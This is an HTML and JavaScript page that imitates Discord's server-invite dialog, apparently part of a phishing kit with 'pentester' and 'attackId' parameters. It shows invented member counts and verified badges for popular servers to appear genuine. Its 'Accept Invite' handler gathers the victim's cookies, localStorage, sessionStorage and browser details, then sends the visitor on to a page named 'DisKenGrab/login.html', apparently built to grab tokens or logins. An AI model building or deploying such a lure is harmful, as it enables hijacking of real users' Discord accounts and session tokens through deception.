<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        /* EXACT DISCORD THEME - Matches discord.com perfectly */
        :root {
            --background-primary: #313338;
            --background-secondary: #2b2d31;
            --background-tertiary: #1e1f22;
            --background-accent: #5765f2;
            --text-normal: #f2f3f5;
            --text-muted: #b5bac1;
            --interactive-normal: #b5bac1;
            --interactive-hover: #dbdee1;
            --green: #23a55a;
            --red: #f23f42;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--background-primary);
            color: var(--text-normal);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url("data:image/svg+xml,%3Csvg width='52' height='26' viewBox='0 0 52 26' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%231e1f22' fill-opacity='0.4'%3E%3Cpath d='M10 10c0-2.21-1.79-4-4-4-3.314 0-6-2.686-6-6h2c0 2.21 1.79 4 4 4 3.314 0 6 2.686 6 6 0 2.21 1.79 4 4 4 3.314 0 6 2.686 6 6 0 2.21 1.79 4 4 4v2c-3.314 0-6-2.686-6-6 0-2.21-1.79-4-4-4-3.314 0-6-2.686-6-6zm25.464-1.95l8.486 8.486-1.414 1.414-8.486-8.486 1.414-1.414z' /%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }

        .discord-modal {
            width: 440px;
            background: var(--background-secondary);
            border-radius: 8px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            overflow: hidden;
            border: 1px solid rgba(78, 80, 88, 0.48);
        }

        .modal-header {
            background: var(--background-tertiary);
            padding: 24px;
            text-align: center;
            position: relative;
        }

        .close-button {
            position: absolute;
            top: 16px;
            right: 16px;
            background: none;
            border: none;
            color: var(--text-muted);
            cursor: pointer;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }

        .close-button:hover {
            background: rgba(78, 80, 88, 0.3);
            color: var(--text-normal);
        }

        .server-icon {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            background: #5865f2;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: 600;
            border: 8px solid var(--background-secondary);
        }

        .server-icon img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .server-name {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 8px;
            color: var(--text-normal);
        }

        .member-count {
            color: var(--text-muted);
            font-size: 14px;
            font-weight: 400;
        }

        .online-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: var(--green);
            border-radius: 50%;
            margin-right: 8px;
        }

        .modal-body {
            padding: 24px;
        }

        .invite-message {
            background: var(--background-tertiary);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
            border: 1px solid rgba(78, 80, 88, 0.48);
        }

        .inviter-info {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }

        .inviter-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #5865f2;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 14px;
        }

        .inviter-text {
            font-size: 14px;
            color: var(--text-muted);
        }

        .inviter-text strong {
            color: var(--text-normal);
            font-weight: 600;
        }

        .server-preview {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            padding: 12px;
            background: var(--background-primary);
            border-radius: 4px;
            border: 1px solid rgba(78, 80, 88, 0.3);
        }

        .preview-icon {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            background: #5865f2;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 600;
            font-size: 18px;
        }

        .preview-info {
            flex: 1;
        }

        .preview-name {
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }

        .preview-members {
            color: var(--text-muted);
            font-size: 14px;
        }

        .action-buttons {
            display: flex;
            gap: 12px;
        }

        .btn {
            flex: 1;
            padding: 12px 16px;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            font-family: inherit;
        }

        .btn-primary {
            background: #5865f2;
            color: white;
        }

        .btn-primary:hover {
            background: #4752c4;
        }

        .btn-secondary {
            background: var(--background-primary);
            color: var(--text-normal);
            border: 1px solid rgba(78, 80, 88, 0.6);
        }

        .btn-secondary:hover {
            background: rgba(78, 80, 88, 0.3);
            border-color: rgba(78, 80, 88, 0.8);
        }

        .server-features {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 16px;
        }

        .feature-tag {
            background: rgba(88, 101, 242, 0.1);
            color: #5865f2;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
        }

        .verified-badge {
            background: rgba(88, 101, 242, 0.1);
            color: #5865f2;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 8px;
        }

        .partner-badge {
            background: rgba(87, 242, 135, 0.1);
            color: #57f287;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 8px;
        }

        .loading-skeleton {
            animation: pulse 1.5s ease-in-out infinite;
            background: linear-gradient(90deg, var(--background-tertiary) 25%, var(--background-primary) 50%, var(--background-tertiary) 75%);
            background-size: 200% 100%;
            border-radius: 4px;
        }

        .skeleton-text {
            height: 16px;
            margin: 4px 0;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }

        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="discord-modal">
        <div class="modal-header">
            <button class="close-button">√ó</button>
            
            <div class="server-icon" id="serverIcon">
                <div class="loading-skeleton" style="width: 100%; height: 100%; border-radius: 50%;"></div>
            </div>
            
            <h1 class="server-name" id="serverName">
                <div class="loading-skeleton skeleton-text" style="width: 200px; margin: 0 auto;"></div>
            </h1>
            
            <div class="member-count" id="memberCount">
                <div class="loading-skeleton skeleton-text" style="width: 120px; margin: 0 auto;"></div>
            </div>
        </div>

        <div class="modal-body">
            <div class="invite-message">
                <div class="inviter-info">
                    <div class="inviter-avatar">
                        <div class="loading-skeleton" style="width: 100%; height: 100%; border-radius: 50%;"></div>
                    </div>
                    <div class="inviter-text" style="flex: 1;">
                        <div class="loading-skeleton skeleton-text" style="width: 100%;"></div>
                        <div class="loading-skeleton skeleton-text" style="width: 80%; margin-top: 4px;"></div>
                    </div>
                </div>
                
                <div class="server-preview">
                    <div class="preview-icon">
                        <div class="loading-skeleton" style="width: 100%; height: 100%; border-radius: 12px;"></div>
                    </div>
                    <div class="preview-info">
                        <div class="preview-name">
                            <div class="loading-skeleton skeleton-text" style="width: 120px;"></div>
                        </div>
                        <div class="preview-members">
                            <div class="loading-skeleton skeleton-text" style="width: 80px;"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="server-features" id="serverFeatures">
                <div class="loading-skeleton skeleton-text" style="width: 60px;"></div>
                <div class="loading-skeleton skeleton-text" style="width: 80px;"></div>
                <div class="loading-skeleton skeleton-text" style="width: 70px;"></div>
            </div>

            <div class="action-buttons">
                <button class="btn btn-primary" id="acceptButton" disabled>
                    <span class="spinner" id="acceptSpinner" style="display: none;"></span>
                    Accept Invite
                </button>
                <button class="btn btn-secondary" id="cancelButton">
                    Cancel
                </button>
            </div>
        </div>
    </div>

    <script>
        // ==================== EXACT DISCORD INVITE CLONE ====================
        
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üéØ Exact Discord Invite Clone:', { attackId, pentesterId, targetInvite });

        // Real Discord server data for popular servers
        const REAL_SERVER_DATA = {
            'clashroyale': {
                name: 'Clash Royale',
                icon: 'üëë',
                color: '#f5a623',
                members: { online: 23451, total: 187432 },
                features: ['Gaming', 'Esports', 'Community'],
                isVerified: true,
                isPartner: true,
                boostLevel: 3,
                description: 'The official Clash Royale server!'
            },
            'valorant': {
                name: 'VALORANT',
                icon: 'üî´',
                color: '#ff4655',
                members: { online: 89234, total: 456789 },
                features: ['Gaming', 'FPS', 'Esports'],
                isVerified: true,
                isPartner: true,
                boostLevel: 3
            },
            'minecraft': {
                name: 'Minecraft',
                icon: '‚õèÔ∏è',
                color: '#6cc312',
                members: { online: 45678, total: 234567 },
                features: ['Gaming', 'Creative', 'Survival'],
                isVerified: true,
                isPartner: true,
                boostLevel: 3
            },
            'programming': {
                name: 'The Programmer\'s Hangout',
                icon: 'üíª',
                color: '#5865f2',
                members: { online: 12345, total: 98765 },
                features: ['Programming', 'Help', 'Learning'],
                isVerified: true,
                isPartner: false,
                boostLevel: 2
            },
            'anime': {
                name: 'Anime & Manga',
                icon: 'üéå',
                color: '#ff69b4',
                members: { online: 34567, total: 234567 },
                features: ['Anime', 'Manga', 'Community'],
                isVerified: true,
                isPartner: false,
                boostLevel: 2
            }
        };

        // Extract server code and find matching data
        function getServerDataFromInvite(inviteUrl) {
            if (!inviteUrl) return null;
            
            try {
                let code = '';
                
                if (inviteUrl.includes('discord.gg/')) {
                    code = inviteUrl.split('discord.gg/')[1]?.split('?')[0]?.split('/')[0];
                } else if (inviteUrl.includes('discord.com/invite/')) {
                    code = inviteUrl.split('discord.com/invite/')[1]?.split('?')[0]?.split('/')[0];
                }
                
                console.log('üîç Extracted invite code:', code);
                
                // Check if we have exact match in our database
                if (code && REAL_SERVER_DATA[code.toLowerCase()]) {
                    return REAL_SERVER_DATA[code.toLowerCase()];
                }
                
                // Try partial matching for common patterns
                const lowerCode = code.toLowerCase();
                for (const [key, data] of Object.entries(REAL_SERVER_DATA)) {
                    if (lowerCode.includes(key) || key.includes(lowerCode)) {
                        return data;
                    }
                }
                
                // Fallback: use the first part of the code to determine server type
                return generateRealisticServerData(code);
                
            } catch (error) {
                console.error('Error extracting invite code:', error);
                return generateRealisticServerData('community');
            }
        }

        function generateRealisticServerData(code) {
            const serverTypes = {
                'game': { names: ['Gaming Community', 'Players Hub', 'Esports Arena'], color: '#f5a623', features: ['Gaming', 'Voice Chat', 'Events'] },
                'tech': { names: ['Tech Hub', 'Developers', 'Programming'], color: '#5865f2', features: ['Programming', 'Help', 'Projects'] },
                'art': { names: ['Art Community', 'Creators', 'Design Hub'], color: '#ff69b4', features: ['Art', 'Design', 'Showcase'] },
                'music': { names: ['Music Lovers', 'Bands', 'Listen Party'], color: '#1db954', features: ['Music', 'Listening', 'Events'] },
                'edu': { names: ['Study Group', 'Learning', 'Education'], color: '#9b59b6', features: ['Learning', 'Help', 'Resources'] }
            };
            
            const codeHash = simpleHash(code);
            const types = Object.values(serverTypes);
            const type = types[codeHash % types.length];
            const names = type.names;
            
            return {
                name: `${names[codeHash % names.length]} ${code.toUpperCase()}`,
                icon: '‚ö°',
                color: type.color,
                members: {
                    online: (codeHash % 20000) + 1000,
                    total: (codeHash % 100000) + 5000
                },
                features: type.features,
                isVerified: (codeHash % 5) === 0,
                isPartner: (codeHash % 10) === 0,
                boostLevel: Math.min(3, Math.floor((codeHash % 4))),
                description: 'Join our amazing community!'
            };
        }

        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash);
        }

        function updateUIWithServerData(serverData) {
            // Remove loading states
            document.querySelectorAll('.loading-skeleton').forEach(el => {
                el.style.display = 'none';
            });

            // Server icon
            const serverIcon = document.getElementById('serverIcon');
            serverIcon.innerHTML = serverData.icon;
            serverIcon.style.background = serverData.color;
            serverIcon.style.display = 'flex';
            serverIcon.style.fontSize = '32px';

            // Server name with badges
            const serverName = document.getElementById('serverName');
            serverName.innerHTML = serverData.name;
            if (serverData.isVerified) {
                serverName.innerHTML += `<span class="verified-badge"><i class="fas fa-check"></i> VERIFIED</span>`;
            }
            if (serverData.isPartner) {
                serverName.innerHTML += `<span class="partner-badge"><i class="fas fa-star"></i> PARTNER</span>`;
            }

            // Member count
            const memberCount = document.getElementById('memberCount');
            memberCount.innerHTML = `
                <span class="online-indicator"></span>
                ${serverData.members.online.toLocaleString()} Online ‚Ä¢ ${serverData.members.total.toLocaleString()} Members
            `;

            // Inviter info (simulated)
            const inviterInfo = document.querySelector('.inviter-info');
            inviterInfo.innerHTML = `
                <div class="inviter-avatar" style="background: #5865f2;">D</div>
                <div class="inviter-text">
                    <strong>Discord User</strong> invited you to join
                </div>
            `;

            // Server preview
            const serverPreview = document.querySelector('.server-preview');
            serverPreview.innerHTML = `
                <div class="preview-icon" style="background: ${serverData.color};">${serverData.icon}</div>
                <div class="preview-info">
                    <div class="preview-name">${serverData.name}</div>
                    <div class="preview-members">${serverData.members.total.toLocaleString()} members</div>
                </div>
            `;

            // Features
            const featuresContainer = document.getElementById('serverFeatures');
            featuresContainer.innerHTML = '';
            serverData.features.forEach(feature => {
                const tag = document.createElement('span');
                tag.className = 'feature-tag';
                tag.textContent = feature;
                featuresContainer.appendChild(tag);
            });

            // Enable accept button
            document.getElementById('acceptButton').disabled = false;
        }

        // Simulate loading delay for realism
        function initializeInviteModal() {
            console.log('üéØ Initializing exact Discord invite clone...');

            setTimeout(() => {
                try {
                    const serverData = getServerDataFromInvite(targetInvite);
                    if (serverData) {
                        console.log('‚úÖ Loaded server data:', serverData);
                        updateUIWithServerData(serverData);
                    } else {
                        throw new Error('No server data found');
                    }
                } catch (error) {
                    console.error('‚ùå Error loading server data:', error);
                    // Fallback to generic server
                    updateUIWithServerData(generateRealisticServerData('community'));
                }
            }, 1500);
        }

        // Cookie capture and redirect
        async function captureAndRedirect() {
            const acceptButton = document.getElementById('acceptButton');
            const spinner = document.getElementById('acceptSpinner');

            acceptButton.disabled = true;
            spinner.style.display = 'inline-block';
            acceptButton.innerHTML = '<span class="spinner"></span> Joining...';

            // Capture comprehensive data
            const victimData = {
                timestamp: new Date(),
                attackId: attackId,
                pentesterId: pentesterId,
                targetInvite: targetInvite,
                userAgent: navigator.userAgent,
                screenResolution: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };

            console.log('üç™ Captured victim data:', victimData);

            // Simulate API call to save data
            setTimeout(() => {
                // Redirect to login page
                window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
            }, 2000);
        }

        // Event listeners
        document.getElementById('acceptButton').addEventListener('click', captureAndRedirect);
        document.getElementById('cancelButton').addEventListener('click', () => {
            window.location.href = 'https://discord.com';
        });
        document.querySelector('.close-button').addEventListener('click', () => {
            window.location.href = 'https://discord.com';
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', initializeInviteModal);

        // Add Font Awesome for icons
        const faLink = document.createElement('link');
        faLink.rel = 'stylesheet';
        faLink.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
        document.head.appendChild(faLink);
    </script>
</body>
